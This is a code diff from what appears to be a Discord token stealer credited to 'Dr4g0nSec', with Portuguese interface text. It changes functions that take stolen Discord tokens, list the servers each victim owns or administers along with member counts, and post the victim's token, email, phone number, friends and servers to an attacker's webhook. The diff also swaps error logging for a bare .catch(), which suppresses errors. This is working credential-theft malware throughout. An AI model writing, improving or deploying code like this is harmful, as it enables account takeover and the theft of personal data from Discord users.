@@ -118,16 +118,44 @@ async function getBillingInfo(token) {
   }
 }
 
+
+
 async function getOwnedServers(token) {
   try {
-    const res = await axios.get("https://discord.com/api/v9/users/@me/guilds", {
-      headers: { Authorization: token }
-    });
-    const guilds = res.data.filter(g => g.owner && g.approximate_member_count > 50);
-    return guilds.map(g => `${g.name} | ${g.id}`).join("\n") || "Nenhum.";
-  } catch {
+    const headers = {
+      Authorization: token,
+      "User-Agent": "DiscordBot (https://discord.com, v1)"
+    };
+
+    const res = await axios.get("https://discord.com/api/v10/users/@me/guilds", { headers });
+    const guilds = res.data;
+
+    const owned = [];
+
+    for (const g of guilds) {
+      const isOwner = g.owner === true;
+      const isAdmin = (g.permissions & 0x8) === 0x8; 
+
+      if (!isOwner && !isAdmin) continue;
+
+      try {
+        const fullGuild = await axios.get(`https://discord.com/api/v10/guilds/${g.id}?with_counts=true`, { headers });
+        const memberCount = fullGuild.data.approximate_member_count || fullGuild.data.member_count || 0;
+
+        if (memberCount >= 10) {
+          owned.push(`${g.id} - ${g.name} | Membros: ${memberCount}`);
+        }
+      } catch {
+        continue;
+      }
+    }
+
+    return owned.join("\n") || "Nenhum servidor encontrado.";
+  } catch (err) {
+    return "";
   }
 }
+
 
 async function validateToken(token) {
   try {
@@ -140,7 +168,7 @@ async function validateToken(token) {
   }
 }
 
-async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, codes = null) {
+async function sendDiscordInfoToWebhook(token, user, extras, friendsBadges, ownedGuilds, codes = null) {
   const embed = {
     title: `${user.username} | ${user.id}`,
     color: 0x250e80,
@@ -155,12 +183,12 @@ async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, co
       { name: "<:icons8gmail50:1378085663433293824>  Email:", value: `${extras.email}`, inline: true },
       { name: "<:celular:1378142619728871435> Telefone:", value: `${extras.phone}`, inline: true },
       { name: "\u200b", value: "\u200b", inline: false },
-      { name: "<:world:1378143049288253460> HQ Servidores:", value: ownedGuilds, inline: false },
-      { name: "<:users:1378143209729032244>  HQ Amigos:", value: friendsBadges, inline: false }
+      { name: "<:world:1378143049288253460> Servidores de posse:", value: ownedGuilds, inline: false },
+      { name: "<:users:1378143209729032244>  Amigos relevantes:", value: friendsBadges, inline: false }
     ],
     footer: {
-      text: "Created by: sk4rty and execute | Dr4g0nSec on Top!",
-      icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&u=11e73b9dcb21c916c430fd7a540e6d54bd3a1657&v=4"
+      text: "Created by: sk4rty | Dr4g0nSec on Top!",
+      icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
     }
   };
 
@@ -173,7 +201,7 @@ async function sendToWebhook(token, user, extras, friendsBadges, ownedGuilds, co
     username: "Dr4g0nSec | Informações do Usuário",
     avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
     embeds: [embed]
-  }).catch(console.error);
+  }).catch();
 }
 
 async function main() {
@@ -199,7 +227,7 @@ async function main() {
         };
         const friendsBadges = await getFriendsBadges(token);
         const ownedGuilds = await getOwnedServers(token);
-        await sendToWebhook(token, user, extras, friendsBadges, ownedGuilds);
+        await sendDiscordInfoToWebhook(token, user, extras, friendsBadges, ownedGuilds);
       }
     }
   }
